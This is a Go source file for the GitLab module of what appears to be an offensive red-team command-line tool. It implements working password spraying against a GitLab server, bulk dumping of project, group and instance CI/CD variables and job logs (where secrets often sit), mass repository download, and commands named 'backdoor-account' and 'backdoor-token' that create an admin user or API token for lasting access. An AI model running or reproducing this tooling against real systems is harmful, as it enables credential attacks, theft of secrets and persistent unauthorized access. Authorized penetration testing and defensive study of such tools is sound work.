package cmd

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/jedib0t/go-pretty/table"
	"github.com/spf13/cobra"
	"github.com/xanzy/go-gitlab"

	log "github.com/sirupsen/logrus"
)

var (
	GL                     GitlabClient
	GITLAB_USERNAME        string
	GITLAB_USERLIST        string
	GITLAB_PASSWORD        string
	GITLAB_SERVER          string
	GITLAB_TOKEN           string
	GITLAB_WORKERS         int
	GITLAB_DOWNLOAD_METHOD string
	GITLAB_TOKEN_USER_ID   int
	GITLAB_PROJECTS        string
	GITLAB_OUTPUTS         string
	GITLAB_VARIABLES       string
	GITLAB_LATEST_JOB      bool
	GITLAB_SPRAY_TIMEOUT   int
	GITLAB_GROUP_ID        int
	GITLAB_LIST_ALL        bool
	GITLAB_GROUPS          string
	GITLAB_ADMIN_USER      bool
)

type GitlabClient struct {
	git *gitlab.Client
}

func NewGitlabClient(cmd *cobra.Command, args []string) {
	var client GitlabClient

	custom_client, err := NewHttpClient()
	if err != nil {
		log.Fatal(err)
	}

	opts := gitlab.WithHTTPClient(custom_client)

	if len(GITLAB_TOKEN) > 0 {
		git, err := gitlab.NewClient(GITLAB_TOKEN, gitlab.WithBaseURL(GITLAB_SERVER), opts)
		if err != nil {
			log.Fatal(err)
		}
		client.git = git
	} else {
		git, err := gitlab.NewBasicAuthClient(GITLAB_USERNAME, GITLAB_PASSWORD, gitlab.WithBaseURL(GITLAB_SERVER), opts)
		if err != nil {
			log.Fatal(err)
		}
		client.git = git
	}

	GL = client
}

func (g *GitlabClient) DownloadWorker(projects chan *gitlab.Project, wg *sync.WaitGroup) error {
	defer wg.Done()

	for p := range projects {
		log.Infof("[Gitlab] Downloading project: %s \n", p.Name)

		if GITLAB_DOWNLOAD_METHOD == "clone" {
			outdir := fmt.Sprintf("%s/%d", GITLAB_PROJECTS, p.ID)
			if len(GITLAB_TOKEN) > 0 {
				err := GitCloneWithToken(p.HTTPURLToRepo, GITLAB_TOKEN, outdir)
				if err != nil {
					log.Error(err)
				}
			} else {
				err := GitCloneWithUserPass(p.HTTPURLToRepo, GITLAB_USERNAME, GITLAB_PASSWORD, outdir)
				if err != nil {
					log.Error(err)
				}
			}
		} else {
			pid := p.ID

			data, _, err := g.git.Repositories.Archive(pid, &gitlab.ArchiveOptions{})
			if err != nil {
				log.Errorf("error downloading project - err: %v", err)
				continue
			}

			path := fmt.Sprintf("%s/%d.tar.gz", GITLAB_PROJECTS, pid)
			err = ioutil.WriteFile(path, data, 0644)
			if err != nil {
				log.Errorf("error saving project - err: %v", err)
				continue
			}
		}

		log.Printf("[Gitlab] Download finished - Clone URL: %s", p.HTTPURLToRepo)
	}

	return nil
}

func (g *GitlabClient) DownloadProjects() error {
	log.Infof("[Gitlab] Server: %s - Downloading Projects", GITLAB_SERVER)

	os.MkdirAll(GITLAB_PROJECTS, os.ModePerm)

	var wg sync.WaitGroup
	wg.Add(GITLAB_WORKERS)

	projects_chan := make(chan *gitlab.Project)
	for i := 0; i < GITLAB_WORKERS; i++ {
		go g.DownloadWorker(projects_chan, &wg)
	}

	opt := &gitlab.ListProjectsOptions{
		ListOptions: gitlab.ListOptions{
			PerPage: 100,
			Page:    1,
		},
	}

	for {
		projects, resp, err := g.git.Projects.ListProjects(opt)
		if err != nil {
			return fmt.Errorf("error listing projects - err: %v", err)
		}

		for _, project := range projects {
			projects_chan <- project
		}

		if resp.CurrentPage >= resp.TotalPages {
			break
		}

		opt.Page = resp.NextPage
	}

	close(projects_chan)

	wg.Wait()

	return nil
}

func (g *GitlabClient) ListProjectVariables() error {
	log.Infof("[Gitlab] Server: %s - Listing CI/CD variables", GITLAB_SERVER)

	opt := &gitlab.ListProjectsOptions{
		ListOptions: gitlab.ListOptions{
			PerPage: 100,
			Page:    1,
		},
	}

	for {
		projects, resp, err := g.git.Projects.ListProjects(opt)
		if err != nil {
			return fmt.Errorf("err: %v", err)
		}

		for _, project := range projects {
			log.Printf("Project: %s", project.Name)

			vars, _, err := g.git.ProjectVariables.ListVariables(project.ID, &gitlab.ListProjectVariablesOptions{})
			if err != nil {
				log.Errorf("err: %v", err)
				continue
			}

			header := table.Row{"PROJECT", "VARIABLE", "VALUE"}
			results := []table.Row{}
			projVars := map[string]string{}

			for _, v := range vars {
				if VERBOSE {
					log.WithFields(log.Fields{
						"project": project.Name,
						"key":     v.Key,
						"value":   v.Value,
					}).Info("Variable found")
				}
				results = append(results, table.Row{project.Name, v.Key, v.Value})
				projVars[v.Key] = v.Value
			}

			if len(results) > 0 {
				CreateTable(header, results)

				projVarsBytes, err := json.Marshal(projVars)
				if err != nil {
					log.Errorf("error in JSON marshal - err: %v", err)
					continue
				}

				outdir := fmt.Sprintf("%s/%d", GITLAB_VARIABLES, project.ID)
				os.MkdirAll(outdir, os.ModePerm)

				varsFile := fmt.Sprintf("%s/project_variables.json", outdir)
				if err = ioutil.WriteFile(varsFile, projVarsBytes, 0644); err != nil {
					log.Errorf("error creating JSON file - err: %v", err)
				}
			}

			fmt.Println()
		}

		if resp.CurrentPage >= resp.TotalPages {
			break
		}

		opt.Page = resp.NextPage
	}

	return nil
}

func (g *GitlabClient) ListUsers() error {
	log.Infof("[Gitlab] Server: %s - Listing Gitlab Users", GITLAB_SERVER)

	header := table.Row{"ID", "USERNAME", "E-MAIL", "NAME", "ADMIN", "2FA", "EXTERNAL"}
	results := []table.Row{}

	opt := &gitlab.ListUsersOptions{
		ListOptions: gitlab.ListOptions{
			PerPage: 100,
			Page:    1,
		},
	}

	for {
		users, resp, err := g.git.Users.ListUsers(opt)
		if err != nil {
			return fmt.Errorf("err: %v", err)
		}

		for _, user := range users {
			if VERBOSE {
				log.WithFields(log.Fields{
					"id":       user.ID,
					"username": user.Username,
					"email":    user.Email,
				}).Info("user found")
			}

			results = append(results, table.Row{user.ID, user.Username, user.Email, user.Name, user.IsAdmin, user.TwoFactorEnabled, user.External})
		}

		if resp.CurrentPage >= resp.TotalPages {
			break
		}

		opt.Page = resp.NextPage
	}

	CreateTable(header, results)

	return nil
}

func (g *GitlabClient) ListProjects() error {
	log.Infof("[Gitlab] Server: %s - Listing Projects", GITLAB_SERVER)

	header := table.Row{"ID", "NAME", "WEB URL"}
	results := []table.Row{}

	opt := &gitlab.ListProjectsOptions{
		ListOptions: gitlab.ListOptions{
			PerPage: 100,
			Page:    1,
		},
	}

	for {
		projects, resp, err := g.git.Projects.ListProjects(opt)
		if err != nil {
			return fmt.Errorf("err: %v", err)
		}

		for _, project := range projects {
			if VERBOSE {
				log.WithFields(log.Fields{
					"id":   project.ID,
					"name": project.Name,
				}).Info("Project found")
			}
			results = append(results, table.Row{project.ID, project.Name, project.WebURL})
		}

		if resp.CurrentPage >= resp.TotalPages {
			break
		}

		opt.Page = resp.NextPage
	}

	CreateTable(header, results)

	return nil
}

func (g *GitlabClient) ListSnippets() error {
	log.Infof("[Gitlab] Server: %s - Listing Snippets", GITLAB_SERVER)

	opt := &gitlab.ListAllSnippetsOptions{
		ListOptions: gitlab.ListOptions{
			PerPage: 100,
			Page:    1,
		},
	}

	header := table.Row{"ID", "TITLE", "URL"}
	results := []table.Row{}

	for {
		snippets, resp, err := g.git.Snippets.ListAllSnippets(opt)
		if err != nil {
			return fmt.Errorf("error listing snippets - err: %v", err)
		}

		for _, snippet := range snippets {
			if VERBOSE {
				log.WithFields(log.Fields{
					"id":    snippet.ID,
					"title": snippet.Title,
					"url":   snippet.WebURL,
				}).Info("snippet found")
			}

			results = append(results, table.Row{snippet.ID, snippet.Title, snippet.WebURL})
		}

		if resp.CurrentPage >= resp.TotalPages {
			break
		}

		opt.Page = resp.NextPage
	}

	CreateTable(header, results)

	return nil
}

func (g *GitlabClient) ListGroups() error {
	log.Infof("[Gitlab] Server: %s - Listing Groups", GITLAB_SERVER)

	allAvailable := true
	opt := &gitlab.ListGroupsOptions{
		AllAvailable: &allAvailable,
		ListOptions: gitlab.ListOptions{
			PerPage: 100,
			Page:    1,
		},
	}

	header := table.Row{"ID", "NAME", "DESCRIPTION", "TOTAL OF PROJECTS"}
	results := []table.Row{}

	for {
		groups, resp, err := g.git.Groups.ListGroups(opt)
		if err != nil {
			return fmt.Errorf("error listing groups - err: %v", err)
		}

		for _, group := range groups {
			if VERBOSE {
				log.WithFields(log.Fields{
					"id":       group.ID,
					"name":     group.Name,
					"url":      group.WebURL,
					"projects": len(group.Projects),
				}).Info("group found")
			}

			results = append(results, table.Row{group.ID, group.Name, group.Description, len(group.Projects)})
		}

		if resp.CurrentPage >= resp.TotalPages {
			break
		}

		opt.Page = resp.NextPage
	}

	CreateTable(header, results)

	return nil
}

func (g *GitlabClient) ListGroupsVariables() error {
	log.Infof("[Gitlab] Server: %s - Listing Groups Variables", GITLAB_SERVER)

	var gids []int

	if GITLAB_LIST_ALL {
		allAvailable := true
		opt := &gitlab.ListGroupsOptions{
			AllAvailable: &allAvailable,
			ListOptions: gitlab.ListOptions{
				PerPage: 100,
				Page:    1,
			},
		}

		for {
			groups, resp, err := g.git.Groups.ListGroups(opt)
			if err != nil {
				return fmt.Errorf("error listing groups - err: %v", err)
			}

			for _, group := range groups {
				gids = append(gids, group.ID)
			}

			if resp.CurrentPage >= resp.TotalPages {
				break
			}

			opt.Page = resp.NextPage
		}
	} else {
		gids = append(gids, GITLAB_GROUP_ID)
	}

	for _, groupID := range gids {
		if err := g.GetGroupVariables(groupID); err != nil {
			log.Error(err)
		}

		fmt.Println()
	}

	return nil
}

func (g *GitlabClient) GetGroupVariables(groupID int) error {
	log.Infof("[Gitlab] Server: %s - Group: %d - Listing Group Variables", GITLAB_SERVER, groupID)

	opt := &gitlab.ListGroupVariablesOptions{
		PerPage: 100,
		Page:    1,
	}

	header := table.Row{"KEY", "VALUE", "ENVIRONMENT SCOPE"}
	results := []table.Row{}

	for {
		vars, resp, err := g.git.GroupVariables.ListVariables(groupID, opt)
		if err != nil {
			return fmt.Errorf("error listing group variables - err: %v", err)
		}

		for _, v := range vars {
			if VERBOSE {
				log.WithFields(log.Fields{
					"group": groupID,
					"key":   v.Key,
					"value": v.Value,
					"env":   v.EnvironmentScope,
				}).Infof("variable found")
			}

			results = append(results, table.Row{v.Key, v.Value, v.EnvironmentScope})
		}

		outdir := fmt.Sprintf("%s/%d", GITLAB_GROUPS, groupID)
		os.MkdirAll(outdir, os.ModePerm)

		groupVarsBytes, _ := json.Marshal(vars)

		varsFile := fmt.Sprintf("%s/group_variables.json", outdir)
		if err = ioutil.WriteFile(varsFile, groupVarsBytes, 0644); err != nil {
			log.Errorf("error creating JSON file - err: %v", err)
		}

		if resp.CurrentPage >= resp.TotalPages {
			break
		}

		opt.Page = resp.NextPage
	}

	CreateTable(header, results)

	return nil
}

func (g *GitlabClient) ListInstanceVars() error {
	log.Infof("[Gitlab] Server: %s - Listing Instance Variables", GITLAB_SERVER)

	opt := gitlab.ListInstanceVariablesOptions{
		PerPage: 100,
		Page:    1,
	}

	header := table.Row{"KEY", "VALUE"}
	results := []table.Row{}

	for {
		vars, resp, err := g.git.InstanceVariables.ListVariables(&opt)
		if err != nil {
			return fmt.Errorf("error listing instance variables - err: %v", err)
		}

		for _, v := range vars {
			if VERBOSE {
				log.WithFields(log.Fields{
					"key":       v.Key,
					"value":     v.Value,
					"masked":    v.Masked,
					"protected": v.Protected,
				}).Printf("variable found")
			}

			results = append(results, table.Row{v.Key, v.Value})
		}

		if resp.CurrentPage >= resp.TotalPages {
			break
		}

		opt.Page = resp.NextPage
	}

	CreateTable(header, results)

	return nil
}

func (g *GitlabClient) CreateAccount() error {
	reader := bufio.NewReader(os.Stdin)

	fmt.Print("Enter username for new account: ")
	username, _ := reader.ReadString('\n')
	username = strings.TrimSuffix(username, "\n")

	fmt.Printf("Enter password for new account: ")
	password, _ := reader.ReadString('\n')
	password = strings.TrimSuffix(password, "\n")

	fmt.Printf("Enter name for new account: ")
	name, _ := reader.ReadString('\n')
	name = strings.TrimSuffix(name, "\n")

	fmt.Printf("Enter email for new account: ")
	email, _ := reader.ReadString('\n')
	email = strings.TrimSuffix(email, "\n")

	adminOpt := GITLAB_ADMIN_USER
	skipConfirmation := true
	projectsLimit := 25

	opt := gitlab.CreateUserOptions{
		Username:         &username,
		Password:         &password,
		Email:            &email,
		Name:             &name,
		Admin:            &adminOpt,
		ProjectsLimit:    &projectsLimit,
		SkipConfirmation: &skipConfirmation,
	}

	usr, _, err := g.git.Users.CreateUser(&opt)
	if err != nil {
		return fmt.Errorf("error creating new user - err: %v", err)
	}

	log.Printf("[Gitlab] New admin user created - Account ID: %d", usr.ID)

	return nil
}

func (g *GitlabClient) CreateToken() error {
	name := "backup"
	scopes := []string{"api"}

	futureDate := time.Now()
	futureDate.AddDate(0, 6, 0)
	expiresAt := gitlab.ISOTime(futureDate)

	opt := gitlab.CreatePersonalAccessTokenOptions{
		Name:      &name,
		ExpiresAt: &expiresAt,
		Scopes:    &scopes,
	}

	token, _, err := g.git.Users.CreatePersonalAccessToken(GITLAB_TOKEN_USER_ID, &opt)
	if err != nil {
		return fmt.Errorf("error creating new access token - err: %v", err)
	}

	fmt.Println(token)

	return nil
}

func (g *GitlabClient) Whoami() error {
	log.Info("[Gitlab] Getting info about current user")

	user, _, err := g.git.Users.CurrentUser()
	if err != nil {
		return fmt.Errorf("error getting info about current user - err: %v", err)
	}

	header := table.Row{"NAME", "EMAIL", "IS ADMIN", "MFA ENABLED"}
	rows := []table.Row{}

	rows = append(rows, table.Row{
		user.Name,
		user.Email,
		user.IsAdmin,
		user.TwoFactorEnabled,
	})

	CreateTable(header, rows)

	return nil
}

func (g *GitlabClient) GetJobsOutputs() error {
	log.Infof("[Gitlab] Server: %s - Listing Jobs Outputs", GITLAB_SERVER)

	os.MkdirAll(GITLAB_OUTPUTS, os.ModePerm)

	projects_chan := make(chan *gitlab.Project)

	var wg sync.WaitGroup
	wg.Add(GITLAB_WORKERS)

	for i := 0; i < GITLAB_WORKERS; i++ {
		go g.OutputWorker(projects_chan, &wg)
	}

	opt := &gitlab.ListProjectsOptions{
		ListOptions: gitlab.ListOptions{
			PerPage: 100,
			Page:    1,
		},
	}

	for {
		projects, resp, err := g.git.Projects.ListProjects(opt)
		if err != nil {
			return fmt.Errorf("err: %v", err)
		}

		for _, p := range projects {
			projects_chan <- p
		}

		if resp.CurrentPage >= resp.TotalPages {
			break
		}

		opt.Page = resp.NextPage
	}

	close(projects_chan)
	wg.Wait()

	return nil
}

func (g *GitlabClient) OutputWorker(projects chan *gitlab.Project, wg *sync.WaitGroup) error {
	defer wg.Done()

	for p := range projects {
		jobs, _, err := g.git.Jobs.ListProjectJobs(p.ID, &gitlab.ListJobsOptions{})
		if err != nil {
			log.Errorf("error listing jobs - project: %s", p.Name)
			continue
		}

		log.Printf("[Gitlab] Project: %s - Total of jobs: %d", p.Name, len(jobs))

		for _, job := range jobs {
			reader, _, err := g.git.Jobs.GetTraceFile(p.ID, job.ID)
			if err != nil {
				log.Errorf("error downloading trace file - project: %s - job: %d", p.ID, job.ID)
				continue
			}

			data, err := ioutil.ReadAll(reader)
			if err != nil {
				log.Errorf("error reading output from CI/CD job - err: %s", err)
				continue
			}

			outdir := fmt.Sprintf("%s/%d", GITLAB_OUTPUTS, p.ID)
			os.Mkdir(outdir, os.ModePerm)

			outfile := fmt.Sprintf("%s/job_%d_output.txt", outdir, job.ID)
			if err := ioutil.WriteFile(outfile, data, 0644); err != nil {
				log.Errorf("error saving job output - project: %s - job: %d - err: %v", p.Name, job.ID, err)
				continue
			}

			log.Printf("[Gitlab] Output from CI/CD job saved - project: %s - job: %d", p.Name, job.ID)

			if GITLAB_LATEST_JOB {
				break
			}
		}
	}

	return nil
}

func GitlabSpray() error {
	userlist, err := os.Open(GITLAB_USERLIST)
	if err != nil {
		return fmt.Errorf("error opening username list - err: %v", err)
	}
	defer userlist.Close()

	scanner := bufio.NewScanner(userlist)
	for scanner.Scan() {
		username := scanner.Text()

		custom_client, err := NewHttpClient()
		if err != nil {
			log.Errorf("error creating http client - err: %v", err)
			continue
		}

		opts := gitlab.WithHTTPClient(custom_client)

		git, err := gitlab.NewBasicAuthClient(username, GITLAB_PASSWORD, gitlab.WithBaseURL(GITLAB_SERVER), opts)
		if err != nil {
			log.Errorf("error creating basic auth client - err: %v", err)
			continue
		}

		user, _, err := git.Users.CurrentUser()
		if err != nil {
			log.Errorf("[Gitlab] unsuccessful login - username: %s - password: %s", username, GITLAB_PASSWORD)
		} else {
			log.Printf("[Gitlab] VALID CREDENTIAL - username: %s - password: %s", user.Username, GITLAB_PASSWORD)
		}

		time.Sleep(time.Duration(GITLAB_SPRAY_TIMEOUT) * time.Second)
	}

	return nil
}

var gitlabSprayCmd = &cobra.Command{
	Use:   "spray",
	Short: "Password Spray",
	Long:  `Password Spray`,

	Run: func(cmd *cobra.Command, args []string) {
		if err := GitlabSpray(); err != nil {
			log.Fatal(err)
		}
	},
}

var gitlabGetOutputsCmd = &cobra.Command{
	Use:    "get-outputs",
	Short:  "Get Outputs from CI/CD Jobs",
	Long:   `Get Outputs from CI/CD Jobs`,
	PreRun: NewGitlabClient,

	Run: func(cmd *cobra.Command, args []string) {
		if err := GL.GetJobsOutputs(); err != nil {
			log.Fatal(err)
		}
	},
}

var gitlabListUsersCmd = &cobra.Command{
	Use:    "list-users",
	Short:  "List Gitlab Users",
	Long:   `List Gitlab Users`,
	PreRun: NewGitlabClient,

	Run: func(cmd *cobra.Command, args []string) {
		if err := GL.ListUsers(); err != nil {
			log.Fatal(err)
		}
	},
}

var gitlabListGroupsCmd = &cobra.Command{
	Use:    "list-groups",
	Short:  "List Gitlab Groups",
	Long:   `List Gitlab Groups`,
	PreRun: NewGitlabClient,

	Run: func(cmd *cobra.Command, args []string) {
		if err := GL.ListGroups(); err != nil {
			log.Fatal(err)
		}
	},
}

var gitlabListProjectsCmd = &cobra.Command{
	Use:    "list-projects",
	Short:  "List Gitlab Projects",
	Long:   `List Gitlab Projects`,
	PreRun: NewGitlabClient,

	Run: func(cmd *cobra.Command, args []string) {
		if err := GL.ListProjects(); err != nil {
			log.Fatal(err)
		}
	},
}

var gitlabListVarsCmd = &cobra.Command{
	Use:    "list-vars",
	Short:  "List Projects Variables",
	Long:   `List Projects Variables`,
	PreRun: NewGitlabClient,

	Run: func(cmd *cobra.Command, args []string) {
		if err := GL.ListProjectVariables(); err != nil {
			log.Fatal(err)
		}
	},
}

var gitlabListGroupVarsCmd = &cobra.Command{
	Use:    "list-groups-vars",
	Short:  "List Groups Variables",
	Long:   `List Groups Variables`,
	PreRun: NewGitlabClient,

	Run: func(cmd *cobra.Command, args []string) {
		if err := GL.ListGroupsVariables(); err != nil {
			log.Fatal(err)
		}
	},
}

var gitlabListInstanceVarsCmd = &cobra.Command{
	Use:    "list-instance-vars",
	Short:  "List Instance Variables",
	Long:   `List Instance Variables`,
	PreRun: NewGitlabClient,

	Run: func(cmd *cobra.Command, args []string) {
		if err := GL.ListInstanceVars(); err != nil {
			log.Fatal(err)
		}
	},
}

var gitlabDownloadProjectsCmd = &cobra.Command{
	Use:    "download-projects",
	Short:  "Download Gitlab Projects",
	Long:   `Download Gitlab Projects`,
	PreRun: NewGitlabClient,

	Run: func(cmd *cobra.Command, args []string) {
		if err := GL.DownloadProjects(); err != nil {
			log.Fatal(err)
		}
	},
}

var gitlabCreateTokenCmd = &cobra.Command{
	Use:    "backdoor-token",
	Short:  "Create backdoor token (Needs admin privs)",
	Long:   `Create backdoor token (Needs admin privs)`,
	PreRun: NewGitlabClient,

	Run: func(cmd *cobra.Command, args []string) {
		if err := GL.CreateToken(); err != nil {
			log.Fatal(err)
		}
	},
}

var gitlabCreateAccountCmd = &cobra.Command{
	Use:    "backdoor-account",
	Short:  "Create backdoor account (Needs admin privs)",
	Long:   `Create backdoor account (Needs admin privs)`,
	PreRun: NewGitlabClient,

	Run: func(cmd *cobra.Command, args []string) {
		if err := GL.CreateAccount(); err != nil {
			log.Fatal(err)
		}
	},
}

var gitlabWhoamiCmd = &cobra.Command{
	Use:    "whoami",
	Short:  "Display info about the current user",
	Long:   `Display info about the current user`,
	PreRun: NewGitlabClient,

	Run: func(cmd *cobra.Command, args []string) {
		if err := GL.Whoami(); err != nil {
			log.Fatal(err)
		}
	},
}

var gitlabListSnippetsCmd = &cobra.Command{
	Use:    "list-snippets",
	Short:  "List snippets",
	Long:   `List snippets`,
	PreRun: NewGitlabClient,

	Run: func(cmd *cobra.Command, args []string) {
		if err := GL.ListSnippets(); err != nil {
			log.Fatal(err)
		}
	},
}

var gitlabCmd = &cobra.Command{
	Use:   "gitlab",
	Short: "Interact with Gitlab Server",
	Long:  `Options for Gitlab Interaction`,

	Run: func(cmd *cobra.Command, args []string) {
		if len(args) == 0 {
			cmd.Help()
			log.Error("the following arguments are required: command")
		}
	},
}

func init() {
	rootCmd.AddCommand(gitlabCmd)

	gitlabCmd.AddCommand(gitlabListUsersCmd)
	gitlabCmd.AddCommand(gitlabListGroupsCmd)
	gitlabCmd.AddCommand(gitlabListProjectsCmd)
	gitlabCmd.AddCommand(gitlabListVarsCmd)
	gitlabCmd.AddCommand(gitlabListGroupVarsCmd)
	gitlabCmd.AddCommand(gitlabDownloadProjectsCmd)
	gitlabCmd.AddCommand(gitlabCreateTokenCmd)
	gitlabCmd.AddCommand(gitlabWhoamiCmd)
	gitlabCmd.AddCommand(gitlabGetOutputsCmd)
	gitlabCmd.AddCommand(gitlabSprayCmd)
	gitlabCmd.AddCommand(gitlabListSnippetsCmd)
	gitlabCmd.AddCommand(gitlabListInstanceVarsCmd)
	gitlabCmd.AddCommand(gitlabCreateAccountCmd)

	gitlabCmd.PersistentFlags().StringVarP(&GITLAB_SERVER, "server", "s", "", "Server Address")
	gitlabCmd.PersistentFlags().StringVarP(&GITLAB_USERNAME, "user", "u", "", "Username")
	gitlabCmd.PersistentFlags().StringVarP(&GITLAB_PASSWORD, "password", "p", "", "Password")
	gitlabCmd.PersistentFlags().StringVarP(&GITLAB_TOKEN, "token", "t", "", "Access Token")

	gitlabDownloadProjectsCmd.Flags().StringVarP(&GITLAB_DOWNLOAD_METHOD, "method", "m", "clone", "Download method (clone or archieve)")

	gitlabCreateTokenCmd.Flags().IntVarP(&GITLAB_TOKEN_USER_ID, "id", "i", 0, "User ID")

	gitlabGetOutputsCmd.Flags().BoolVarP(&GITLAB_LATEST_JOB, "latest", "l", false, "Get output from latest job")

	gitlabSprayCmd.Flags().StringVarP(&GITLAB_USERLIST, "userlist", "x", "", "Userlist path")
	gitlabSprayCmd.Flags().IntVarP(&GITLAB_SPRAY_TIMEOUT, "timeout", "n", 5, "Timeout between login attempts (seconds)")

	gitlabListGroupVarsCmd.Flags().IntVarP(&GITLAB_GROUP_ID, "group", "g", 0, "Group ID")
	gitlabListGroupVarsCmd.Flags().BoolVarP(&GITLAB_LIST_ALL, "all", "a", true, "List all groups")

	gitlabCreateAccountCmd.Flags().BoolVarP(&GITLAB_ADMIN_USER, "admin", "a", true, "Create new account as admin")

	var err error

	if GITLAB_PROJECTS, err = GetConfigParam("gitlab.projects"); err != nil {
		log.Fatal(err)
	}

	if GITLAB_OUTPUTS, err = GetConfigParam("gitlab.outputs"); err != nil {
		log.Fatal(err)
	}

	if GITLAB_VARIABLES, err = GetConfigParam("gitlab.variables"); err != nil {
		log.Fatal(err)
	}

	if GITLAB_GROUPS, err = GetConfigParam("gitlab.groups"); err != nil {
		log.Fatal(err)
	}

	if GITLAB_WORKERS, err = GetConfigParamInt("gitlab.workers"); err != nil {
		log.Fatal(err)
	}
}
